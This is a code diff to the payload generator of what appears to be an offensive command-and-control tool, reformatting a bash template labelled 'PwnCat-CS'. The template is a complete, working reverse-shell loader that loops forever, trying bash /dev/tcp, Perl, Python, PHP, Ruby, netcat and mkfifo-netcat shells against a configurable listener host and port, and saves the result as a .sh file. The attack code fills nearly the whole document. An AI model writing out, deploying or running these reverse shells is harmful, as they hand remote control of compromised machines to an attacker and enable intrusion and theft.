@@ -321,54 +321,54 @@ def generate_payload(app, tail, file_format, listener_name):
         elif tail == "PwnCat-CS":
             content = f"""#!/bin/bash
 
-    HOST={listener_host}
-    PORT={listener_port}
+HOST={listener_host}
+PORT={listener_port}
 
-    try_bash() {{
-        /bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1
-    }}
+try_bash() {{
+    /bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1
+}}
 
-    try_perl() {{
-        perl -e 'use Socket;$i="'"$HOST"'";$p='"$PORT"';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'
-    }}
+try_perl() {{
+    perl -e 'use Socket;$i="'"$HOST"'";$p='"$PORT"';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'
+}}
 
-    try_python() {{
-        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"$HOST"'",'"$PORT"'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-    }}
+try_python() {{
+    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"$HOST"'",'"$PORT"'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+}}
 
-    try_php() {{
-        php -r '$sock=fsockopen("'"$HOST"'",'"$PORT"');exec("/bin/sh -i <&3 >&3 2>&3");'
-    }}
+try_php() {{
+    php -r '$sock=fsockopen("'"$HOST"'",'"$PORT"');exec("/bin/sh -i <&3 >&3 2>&3");'
+}}
 
-    try_ruby() {{
-        ruby -rsocket -e'f=TCPSocket.open("'"$HOST"'",'"$PORT"'").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-    }}
+try_ruby() {{
+    ruby -rsocket -e'f=TCPSocket.open("'"$HOST"'",'"$PORT"'").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+}}
 
-    try_nc() {{
-        nc -e /bin/sh $HOST $PORT
-    }}
+try_nc() {{
+    nc -e /bin/sh $HOST $PORT
+}}
 
-    try_mkfifo_nc() {{
-        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $HOST $PORT >/tmp/f
-    }}
+try_mkfifo_nc() {{
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $HOST $PORT >/tmp/f
+}}
 
-    reversa_shells=(try_bash try_perl try_python try_php try_ruby try_nc try_mkfifo_nc)
+reversa_shells=(try_bash try_perl try_python try_php try_ruby try_nc try_mkfifo_nc)
 
-    while true; do
-        for shell in "${{reversa_shells[@]}}"; do
-            if command -v $shell &>/dev/null; then
-                $shell
-                if [ $? -eq 0 ]; then
-                    break
-                else
-                    $null
-                fi
+while true; do
+    for shell in "${{reversa_shells[@]}}"; do
+        if command -v $shell &>/dev/null; then
+            $shell
+            if [ $? -eq 0 ]; then
+                break
             else
                 $null
             fi
-        done
+        else
+            $null
+        fi
     done
-    """
+done
+"""
             if file_format == "Bash":
                 dst_name = "PwnCat_" + str(listener_port) + ".sh"
                 dst_file = os.path.join(payloads_dir, dst_name.lower())        
